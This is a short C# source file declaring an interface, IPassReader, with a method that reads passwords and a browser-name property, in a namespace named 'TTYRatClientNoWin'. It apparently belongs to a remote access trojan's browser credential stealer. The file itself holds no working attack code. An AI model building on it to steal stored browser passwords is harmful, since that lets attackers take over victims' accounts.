using System.Collections.Generic;

namespace TTYRatClientNoWin
{
    interface IPassReader
    {
        IEnumerable<CredentialModel> ReadPasswords();
        string BrowserName { get; }
    }
}